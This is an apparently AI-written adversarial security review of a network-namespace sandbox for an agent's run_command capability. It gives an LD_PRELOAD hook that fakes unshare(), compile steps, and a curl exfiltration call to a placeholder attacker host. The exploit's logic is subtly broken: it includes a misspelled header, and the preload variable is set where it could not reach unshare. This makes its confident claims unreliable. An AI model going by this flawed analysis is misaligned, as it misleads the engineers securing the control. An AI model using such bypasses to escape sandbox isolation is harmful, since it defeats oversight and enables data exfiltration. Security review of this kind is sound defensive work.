# netns code panel: google/gemini-2.5-pro

_finish=stop seconds=60.0 cost=$0.0828 usage={'prompt_tokens': 18108, 'completion_tokens': 6021, 'total_tokens': 24129, 'cost': 0.082845, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.082845, 'upstream_inference_prompt_cost': 0.022635, 'upstream_inference_completions_cost': 0.06021}, 'completion_tokens_details': {'reasoning_tokens': 4668, 'image_tokens': 0, 'audio_tokens': 0}}_

Excellent. As a senior Linux-security engineer, my focus is on breaking assumptions and finding concrete bypasses. The author has fixed the most obvious PATH-shadowing bug, but the interaction between a privileged-within-the-userns child, a shared mount namespace, and an unsanitized environment is a fertile ground for vulnerabilities.

Here is my adversarial review.

***

### VULN-01 / `LD_PRELOAD` Hijacking Defeats Network Namespace Isolation

*   **SEVERITY:** CRITICAL
*   **LOCATION:** `salienceos/verifier/observers.py:214` (the `subprocess.run` call in `run_supervised`)
*   **CONCRETE BYPASS:**
    An attacker with `run_command` capability can craft a malicious shared library and use the `LD_PRELOAD` environment variable to subvert the `unshare` binary, silently disabling network isolation while the `network_isolated` flag is still reported as `True`.

    1.  Create a malicious shared library, `bypass.c`:
        ```c
        #define _GNU_SOURCE
        #include <unistd.h>
        #include <stdio.hh>

        /*
         * Override the unshare(2) syscall wrapper in libc.
         * When the /usr/bin/unshare command calls unshare(), it will call this
         * function instead. We simply do nothing and return 0 (success).
         * The unshare command proceeds, thinking it has created a new netns,
         * and execs the user's command, which now runs on the HOST network.
         */
        int unshare(int flags) {
            fprintf(stderr, "[LD_PRELOAD] unshare() hooked, returning 0. NO ISOLATION!\n");
            return 0; // Lie and say it worked.
        }
        ```

    2.  Compile it in the workspace:
        `run_command "gcc -shared -fPIC -o bypass.so bypass.c"`

    3.  Execute a network-reaching command with `LD_PRELOAD`:
        `run_command "LD_PRELOAD=./bypass.so curl http://<attacker-ip>:8000/pwned"`

*   **WHY IT BREAKS ISOLATION AND THE FLAG'S HONESTY:**
    The `run_supervised` function at `salienceos/verifier/observers.py:214` calls `subprocess.run` without explicitly managing the environment. This means the child process (`/usr/bin/unshare`) inherits the environment of the parent Python process, including any `LD_PRELOAD` variable set by the user's command string.

    The dynamic linker (`ld.so`) sees `LD_PRELOAD` and loads our `bypass.so` library before `unshare` even starts. Our library overrides the `unshare(2)` syscall. When the `unshare` binary tries to create the network namespace, our malicious function is called instead. It does nothing and returns success. The `unshare` binary, believing it has successfully isolated the process, then proceeds to `exec` the user's real command (`curl ...`).

    The result is a **complete isolation bypass**: `curl` runs with full host network access. Crucially, the `network_isolated` flag is a **lie**. `wrap_no_network` returned `True` because `netns_available()` is true, and the `unshare` command was prepended. The system reports `🔒 net-isolated` while the attacker exfiltrates data. This is the worst-case failure mode for an honesty-first control.

*   **WHETHER ANOTHER CONTROL CATCHES IT:**
    **No.** This bypass subverts the primary isolation control at its point of application. No other mechanism described (verifier, supervisor exit code) can detect that the namespace was not actually created. The `unshare` command exits 0, and the inner `curl` command exits 0, so all post-facto checks pass.

*   **FIX:**
    The `run_supervised` function must sanitize the environment passed to `subprocess.run`. The safest approach is to create a minimal, clean environment. A less disruptive but still effective fix is to remove dangerous `LD_*` variables from the inherited environment.

    ```python
    # In salienceos/verifier/observers.py, inside run_supervised()

    import os

    # ...
    env = os.environ.copy()
    for key in ["LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "LD_DEBUG"]:
        env.pop(key, None)

    completed = subprocess.run(
        argv,
        cwd=str(cwd),
        capture_output=True,
        timeout=timeout_seconds,
        check=False,
        env=env,  # Pass the sanitized environment
    )
    # ...
    ```

***

### STEELMAN (Best defense of the existing code)

The shipped code correctly identifies and fixes a critical PATH-shadowing vulnerability by resolving `unshare` to an absolute path at import time, preventing a race condition where the child could modify the PATH to execute a fake binary. It also correctly uses `exec "$@"` within its `sh -c` wrapper to prevent shell command injection on arguments containing metacharacters. The vulnerability is not in the namespacing logic itself, but in the supervisor's failure to provide a sanitized execution environment, an issue one layer removed from the primary `netns.py` module that was the focus of the change.

### VERDICT

**SERIOUS_FLAWS.**

While the fix for PATH shadowing was necessary, it missed the equally classic and far more subtle vulnerability of environment-variable injection. The `LD_PRELOAD` bypass provides a complete and silent break of the network isolation guarantee, and critically, it causes the `network_isolated` honesty flag to lie. This undermines the entire premise of the control and must be fixed immediately.

**Highest-Value Fix:** Sanitize the environment in `run_supervised` by creating a clean `env` dictionary or at minimum unsetting all `LD_*` variables before calling `subprocess.run`.
